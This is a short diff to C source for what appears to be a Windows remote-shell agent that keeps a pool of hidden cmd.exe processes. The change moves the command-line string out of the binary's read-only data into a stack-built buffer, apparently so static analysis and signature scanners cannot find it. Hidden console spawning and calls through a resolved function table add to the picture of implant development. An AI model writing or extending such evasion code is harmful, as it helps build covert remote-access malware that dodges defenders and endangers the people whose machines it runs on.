@@ -5,6 +5,7 @@
 #include "shell.h"
 #include "kernel32.h"
 #include "memory.h"
+#include "stackstrings.h"
 
 /* C1 step 2: no static pool. agent_main() owns the array on its frame
  * (its lifetime = the process) and passes it to every pool function.
@@ -53,7 +54,10 @@ int shell_spawn(shell_slot *slot)
      * after the chcp command completes. The command line MUST be a
      * writable buffer: CreateProcessW is documented to modify it in place,
      * so a string literal (read-only .rdata) crashes inside the call. */
-    WCHAR cmdline[] = L"cmd.exe /K chcp 65001 >nul";
+    /* C1 step 3b: the command line is stack-built (no .rdata literal);
+     * still a WRITABLE frame buffer - CreateProcessW modifies it in place. */
+    WCHAR cmdline[27];
+    StrCmdline(cmdline);
     BOOL ok = kernel.CreateProcessW(NULL, cmdline,
                              NULL, NULL, TRUE, CREATE_NO_WINDOW,
                              NULL, NULL, &si, &pi);
